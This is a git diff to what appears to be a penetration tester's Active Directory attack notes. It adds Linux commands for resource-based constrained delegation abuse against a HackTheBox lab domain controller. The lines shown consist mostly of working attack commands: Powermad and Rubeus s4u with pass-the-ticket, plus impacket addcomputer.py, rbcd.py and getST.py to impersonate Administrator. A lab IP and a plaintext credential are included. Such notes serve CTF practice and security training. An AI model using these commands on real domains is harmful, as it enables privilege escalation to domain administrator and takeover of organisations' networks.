@@ -414,6 +414,8 @@ Get-NetComputer ws01 | Select-Object -Property name, msds-allowedtoactonbehalfof
 ```
 
 ### Attack
+#### Windows
+
 **Creating a Computer Object**
 ```shell
 import-module powermad
@@ -449,6 +451,22 @@ Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofother
 ./rubeus.exe s4u /user:fake01$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash>  /impersonateuser:administrator /msdsspn:cifs/DC.offense.local /ptt
 
 ./rubeus.exe s4u /user:fake01$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/DC.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
+```
+
+#### Linux 
+
+```bash
+# from support machine htb
+# we have this user support:Ironside47pleasure40Watchful which is part of a group that that genricall on the DC$
+
+# add computer X (house)
+addcomputer.py -computer-name 'house$' -computer-pass 'housepass' -dc-host 10.129.109.105 'support.htb/support:Ironside47pleasure40Watchful'
+
+# change msDS-AllowedToActOnBehalfOfOtherIdentity value on DC$, using support account creds  
+rbcd.py -delegate-from 'house$' -delegate-to 'DC$' -dc-ip 10.129.109.105 -action 'write' 'support.htb/support:Ironside47pleasure40Watchful'
+
+# get the kerpros ticket 
+getST.py -spn 'cifs/dc.support.htb' -impersonate Administrator -dc-ip 10.129.109.105 'support.htb/house$:housepass'
 ```
 
 # Ticket abuse
